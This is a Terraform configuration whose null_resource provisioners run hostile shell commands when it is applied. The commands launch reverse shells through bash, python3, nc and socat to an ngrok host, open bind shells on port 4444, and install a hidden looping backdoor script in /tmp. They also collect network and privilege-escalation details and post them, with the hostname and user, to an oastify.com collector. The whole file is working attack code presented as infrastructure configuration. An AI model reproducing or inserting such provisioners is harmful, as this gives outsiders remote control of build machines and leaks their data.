resource "null_resource" "reverse_shell" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== REVERSE SHELL ATTEMPT ==="
      echo "container: $(cat /etc/hostname)"
      echo "user: $(whoami)"
      echo "starting reverse shell attempts..."
      
      # Method 1: bash reverse shell
      which bash && echo "bash available - attempting reverse shell" && bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1' &
      
      # Method 2: python3 reverse shell
      which python3 && echo "python3 available - attempting reverse shell" && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &
      
      # Method 3: nc reverse shell
      which nc && echo "netcat available - attempting reverse shell" && nc -e /bin/sh 6.tcp.eu.ngrok.io 19850 &
      
      # Method 4: socat if available
      which socat && echo "socat available - attempting reverse shell" && socat TCP:6.tcp.eu.ngrok.io:19850 EXEC:/bin/sh &
      
      echo "reverse shell attempts launched in background"
      
      # Keep the process alive and send confirmation
      curl -X POST -d "reverse_shell_attempted=true&container=$(cat /etc/hostname)&user=$(whoami)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/reverse_shell
    EOT
  }
}

resource "null_resource" "fallback_shell" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== FALLBACK SHELL METHODS ==="
      
      # Create a simple bind shell on port 4444 as fallback
      which nc && echo "starting bind shell on 4444" && nc -lvp 4444 -e /bin/sh &
      which python3 && echo "starting python bind shell" && python3 -c 'import socket as s,subprocess as sp,os;so=s.socket(s.AF_INET,s.SOCK_STREAM);so.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);so.bind(("0.0.0.0",4444));so.listen(1);c,a=so.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];sp.call(["/bin/sh","-i"])' &
      
      # Send network info for connection
      echo "=== NETWORK INFO ===" > /tmp/network_info.txt
      ip addr >> /tmp/network_info.txt
      netstat -tulpn 2>/dev/null >> /tmp/network_info.txt
      curl -X POST --data-binary @/tmp/network_info.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/network_info
    EOT
  }
}

resource "null_resource" "persistent_access" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PERSISTENT ACCESS SETUP ==="
      
      # Create backdoor script
      cat > /tmp/.backdoor.sh << 'EOF'
#!/bin/bash
while true; do
  # Try reverse shell every 30 seconds
  bash -c 'exec 5<>/dev/tcp/6.tcp.eu.ngrok.io/19850; cat <&5 | while read line; do $line 2>&5 >&5; done' 2>/dev/null &
  sleep 30
  # Clean up dead processes
  pkill -f "dev/tcp" 2>/dev/null
done
EOF
      
      chmod +x /tmp/.backdoor.sh
      nohup /tmp/.backdoor.sh > /dev/null 2>&1 &
      
      echo "persistent backdoor installed"
      curl -X POST -d "backdoor_installed=true&container=$(cat /etc/hostname)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/backdoor
    EOT
  }
}

resource "null_resource" "privilege_check" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PRIVILEGE ESCALATION CHECK ===" > /tmp/priv.txt
      echo "user: $(whoami)" >> /tmp/priv.txt
      echo "id: $(id)" >> /tmp/priv.txt
      echo "sudo: $(which sudo && sudo -l || echo 'no sudo')" >> /tmp/priv.txt
      echo "capabilities: $(capsh --print 2>/dev/null | head -10 || echo 'no capsh')" >> /tmp/priv.txt
      echo "suid files: $(find / -perm -4000 2>/dev/null | head -10)" >> /tmp/priv.txt
      
      curl -X POST --data-binary @/tmp/priv.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/privilege_check
    EOT
  }
}
